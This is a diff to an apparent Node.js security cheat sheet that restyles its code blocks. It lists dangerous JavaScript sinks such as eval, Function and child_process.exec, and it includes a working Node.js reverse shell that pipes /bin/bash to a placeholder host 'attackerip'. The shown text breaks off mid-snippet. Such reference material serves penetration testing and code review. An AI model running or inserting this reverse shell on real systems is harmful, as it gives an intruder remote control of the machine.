@@ -5,24 +5,24 @@
 
 ### Dangerous Functions
 
-```
-# RCE
+```js
+/* RCE */
 eval()                  //evaluate string as a javascript code
 safe-eval()             //same as eval, but more secure.
 setTimeout(string, 2)
 setInterval(string)
 Function(string)
 
-# Command Execution
+/* Command Execution */
 child_process.exec()
 
-# LFI
+/* LFI */
 require()
 ```
 
 ### Reverse Shell
 
-```
+```js
 var net = require("net"), sh = require("child_process").exec("/bin/bash");
 var client = new net.Socket();
 client.connect(80, "attackerip", function(){client.pipe(sh.stdin);sh.stdout.pipe(client);
